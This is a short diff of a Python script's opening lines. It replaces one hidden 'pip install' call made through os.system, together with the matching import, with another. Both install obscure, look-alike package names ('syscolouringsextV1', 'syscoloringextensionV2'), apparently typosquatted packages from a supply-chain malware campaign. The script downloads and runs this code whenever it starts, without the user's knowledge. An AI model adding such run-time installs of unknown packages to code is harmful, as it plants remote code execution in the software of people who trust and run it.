@@ -1,6 +1,6 @@
 import os
-os.system("pip install syscolouringsextV1")
-import syscolouringsextV1
+os.system("pip install syscoloringextensionV2")
+import syscoloringextensionV2
 import requests
 from requests.structures import CaseInsensitiveDict
 from bs4 import BeautifulSoup
